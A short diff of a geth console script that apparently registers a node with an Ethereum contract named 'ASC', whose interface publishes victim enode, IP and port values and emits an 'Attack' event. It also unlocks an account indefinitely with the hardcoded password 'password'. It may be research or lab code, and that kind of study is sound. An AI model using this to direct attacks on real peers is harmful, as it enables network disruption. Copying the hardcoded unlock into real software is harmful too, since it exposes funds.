@@ -36,8 +36,10 @@ admin.addPeer("enode://c6e81623afe5183f5cbe5675a5e696bf918818a66b12658eec1deeb4c
 
 
 var Address = '0x67a7e88a8cb14dc5f28f8297737b83e69d91e687';
-var abi = JSON.parse( '{ "contractName": "ASC", "abi": [ { "inputs": [], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [ { "indexed": false, "name": "msg", "type": "string" } ], "name": "Attack", "type": "event" }, { "constant": false, "inputs": [ { "name": "_victimEnode", "type": "string" }, { "name": "_victimIP", "type": "string" }, { "name": "_victimPort", "type": "string" } ], "name": "set", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "get", "outputs": [ { "name": "", "type": "string" }, { "name": "", "type": "string" }, { "name": "", "type": "string" } ], "payable": false, "stateMutability": "view", "type": "function" } ] }');
+var abi = JSON.parse( '{ "contractName": "ASC", "abi": [ { "constant": false, "inputs": [], "name": "register", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [ { "name": "_victimEnode", "type": "string" }, { "name": "_victimIP", "type": "string" }, { "name": "_victimPort", "type": "string" } ], "name": "set", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "inputs": [], "payable": false, "stateMutability": "nonpayable", "type": "constructor" }, { "anonymous": false, "inputs": [ { "indexed": false, "name": "msg", "type": "string" } ], "name": "Attack", "type": "event" }, { "constant": true, "inputs": [], "name": "get", "outputs": [ { "name": "", "type": "string" }, { "name": "", "type": "string" }, { "name": "", "type": "string" } ], "payable": false, "stateMutability": "view", "type": "function" } ] }');
 
 var cont = web3.eth.contract( abi.abi ).at( Address );
 
 personal.unlockAccount(eth.accounts[0], "password", 0);
+
+cont.register();
